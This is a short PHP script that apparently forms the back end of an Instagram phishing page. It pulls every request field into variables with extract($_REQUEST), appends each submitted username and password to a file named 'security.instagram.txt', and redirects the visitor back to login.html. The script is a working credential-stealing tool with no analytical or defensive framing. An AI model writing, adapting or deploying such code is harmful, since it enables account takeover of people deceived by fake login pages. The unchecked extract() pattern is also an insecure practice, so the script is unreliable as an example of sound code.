<?php
header('Location: login.html');
extract($_REQUEST);
$file=fopen("security.instagram.txt","a");

fwrite($file,"username : ");
fwrite($file,$username ."\n");
fwrite($file,"password : ");
fwrite($file, $password ."\n");
fwrite($file,"done");
fwrite($file,$done . "\n");
fclose($file);
?>
